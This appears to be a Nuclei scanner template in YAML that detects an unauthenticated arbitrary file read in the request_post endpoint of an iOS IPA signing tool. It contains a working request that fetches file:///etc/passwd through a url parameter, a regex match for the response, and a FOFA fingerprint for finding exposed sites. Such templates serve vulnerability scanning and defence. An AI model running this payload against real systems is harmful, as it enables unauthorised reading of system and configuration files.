http:
    - matchers:
        - part: body
          regex:
            - root:.*:0:0
          type: regex
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
id: IOS-request_post-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="/assets/index/css/mobileSelect.css"
        苹果IOS端IPA签名工具 request_post 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 苹果IOS端IPA签名工具 request_post 任意文件读取
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487848&idx=1&sn=cd118dd8cc14fd1bcb14ce9a7aa2bb19&chksm=c267a45bf5102d4dde8f94dcda61de393ba4040198003925c25654cfb940ee3035ab5f6b7ad7&token=65579130&lang=zh_CN#rd
    severity: high
    tags:
        - File reading
